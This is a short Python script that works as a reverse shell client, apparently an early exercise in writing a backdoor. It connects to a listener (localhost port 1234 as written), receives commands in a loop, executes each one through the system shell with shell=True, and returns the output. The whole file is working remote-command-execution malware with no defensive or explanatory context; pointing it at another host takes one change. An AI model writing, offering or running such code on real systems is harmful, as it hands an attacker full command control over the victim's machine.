#!/usr/bin/python

import socket
import subprocess


def execute_system_commmand(command):
	return subprocess.check_output(command,shell=True)

connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("localhost",1234))

#connection.send("[+]Connection Estabilshed.\n")

while True:
	command = connection.recv(1024)
	command_result = execute_system_commmand(command)
	connection.send(command_result)

connection.close()